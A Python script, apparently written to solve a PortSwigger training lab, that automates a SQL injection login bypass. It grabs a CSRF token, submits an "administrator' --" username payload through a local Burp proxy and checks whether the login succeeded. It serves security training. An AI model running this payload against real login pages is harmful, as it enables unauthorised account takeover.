import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import signal

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

""" 02_loginbypass.py ##########################################################
Lab: SQL injection vulnerability allowing login bypass
https://portswigger.net/web-security/sql-injection/lab-login-bypass

02_loginbypass.py <exploit_type> <url> <sql-payload> <text-to-search>"
python3 02_loginbypass.py lb "https://website.net/login" "administrator' --" "Log out"'

SQLi vulnerability in the login function. This is an SQL injection attack where 
you can log in to the application as the administrator user.

This (proxies) will pass it through the proxy, which is burp. Then it 
will relay it back to the web server. Then any response from the web 
server will get through the proxy again, back to the application and 
so on. This is great for debugging scripts.
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def get_csrf_token(sess, url):
    try:
        req = sess.get(url, verify=False, proxies=proxies)
        # Check the HTML to see where to parse the CSRF from.
        beau_soup = BeautifulSoup(req.text, "html.parser")
        # Find the first input element and get its value.
        csrf = beau_soup.find("input")["value"]
        return csrf
    except Exception as e:
        template = "An exception of type {0} occurred. Arguments:\n{1!r}"
        message = template.format(type(e).__name__, e.args)
        if type(e).__name__ == "ProxyError":
            print("Error Type: ProxyError. Check the proxy.")
        else:
            print("Error Return Type: ", type(e))


def exploit_sqli(sess, url, payload, text):
    csrf = get_csrf_token(sess, url)
    # Data needed for the exploit.
    data = {"csrf": csrf, "username": payload, "password": "anything"}
    # Send a POST request.
    try:
        req = sess.post(url, data=data, verify=False, proxies=proxies)
        # Check if the request logged in by looking in the response text.
        # If true, it means the exploit worked as intended.
        res = req.text
        if text in res:
            return True
        else:
            return False
    except Exception as e:
        print("Error Return Type: ", type(e))


def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        text = sys.argv[3].strip()
    except IndexError as error:
        print(f"Error: {error}")
        print("[-] Usage: %s <url> <sql-payload> <text-to-search>" % sys.argv[0])
        print(
            '[-] Example: %s python3 sqli-lab-02a.py "https://website.net/login" "administrator\' --" "Log out"'
            % sys.argv[0]
        )
    # Use Session to make certain parameters persistant accross the session.
    # You don't want to send a new request every time in this case.
    # For example, we will need the cookie to stay the same.
    sess = requests.Session()

    if exploit_sqli(sess, url, payload, text):
        print("[+] SQL injection successful. You're logged in.")
    else:
        print("[-] SQL injection unsuccessful.")
